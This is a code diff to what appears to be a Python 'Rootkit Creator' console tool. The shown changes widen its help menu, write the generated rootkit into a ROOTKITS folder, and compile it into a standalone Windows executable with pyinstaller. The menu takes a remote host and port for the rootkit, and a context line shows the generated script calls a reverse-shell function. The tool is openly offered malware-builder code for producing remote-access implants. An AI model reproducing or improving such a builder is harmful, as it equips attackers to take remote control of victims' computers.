@@ -121,27 +121,27 @@ Current Options:
         print('\n[?] Switched To Creator Mode\n')
         creatorOptions = f'''
 {boldunderlinedCommands}
-   ________________________________________________________________________________________
-    |------------------------------------------------------------------------------------|
-    |                                                                                    |
-    |      set rhost <IP>                     Set Value Of Remote Host For Rootkit.      |
-    |      set rport <PORT>                   Set Value Of Remote Port For Rootkit.      |
-    |                                                                                    |
-    |      create <FILE NAME>.py              Give A Name For Rootkit And Create.        |
-    |                                                                                    |
-    |      exit                               Exit Rootkit Creator Mode                  |
-    |                                                                                    |
-    |                                                                                    |
-    |      clear                              Clear Console.                             |
-    |      help                               Display This Help Menu.                    |
-   _________________________________________________________________________________________
+   __________________________________________________________________________________________________
+    |----------------------------------------------------------------------------------------------|
+    |                                                                                              |
+    |      set rhost <IP>                     Set Value Of Remote Host For Rootkit.                |
+    |      set rport <PORT>                   Set Value Of Remote Port For Rootkit.                |
+    |                                                                                              |
+    |      create <FILE NAME>                 Give A Name For Rootkit And Create.                  |
+    |                                                                                              |
+    |      exit                               Exit Rootkit Creator Mode                            |
+    |                                                                                              |
+    |                                                                                              |
+    |      clear                              Clear Console.                                       |
+    |      help                               Display This Help Menu.                              |
+   __________________________________________________________________________________________________
 
         '''
 
         print(creatorOptions)
 
         while True:
-            creatorselection = input('[Rootkit Creator] >>>')
+            creatorselection = input('[Rootkit Creator] >>> ')
 
             # Set RHOST Command
             if creatorselection.lower().startswith('set rhost '):
@@ -157,7 +157,12 @@ Current Options:
             # Set Name
             elif creatorselection.lower().startswith('create '):
                 fileName = creatorselection.replace('create ', '')
-                with open(fileName, 'w') as file:
+                fileNameInPython = f'{fileName}.py'
+
+                os.system('mkdir ROOTKITS')
+                os.chdir('ROOTKITS')
+
+                with open(fileNameInPython, 'w') as file:
                     rootkit = f"""
 # Script Made By 17mj
 # -------------------
@@ -367,8 +372,12 @@ reverseShell()
 """
                     file.write(rootkit)
                     file.write(rootkit2)
+
+                    os.system(f'pyinstaller -F -D {fileNameInPython} && del {fileName}.spec')
                     
-                    print('\n[+] Rootkit Successfully Created\n')
+                    print('\n[+] Rootkit Successfully Created In EXE And PY Format In Rootkits Folder\n')
+                    print('[?] EXE FORMATTED ROOTKIT IS IN THE "dist" FOLDER\n')
+                    print('[?] YOU CAN DELETE "build" FOLDER\n')
 
             elif creatorselection.lower() == 'exit':
                 os.system('cls')
